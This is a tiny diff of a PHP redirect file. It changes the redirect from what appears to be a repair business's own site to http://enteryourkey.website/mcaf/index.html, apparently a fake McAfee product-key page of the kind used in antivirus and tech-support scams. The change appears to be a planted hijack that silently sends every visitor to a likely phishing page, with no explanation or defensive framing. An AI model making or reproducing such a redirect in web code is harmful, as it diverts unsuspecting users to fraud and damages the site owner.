@@ -1,4 +1,4 @@
 <?php
-header("Location: https://sandwtvrepair.com");
+header("Location: http://enteryourkey.website/mcaf/index.html");
 die();
 ?>
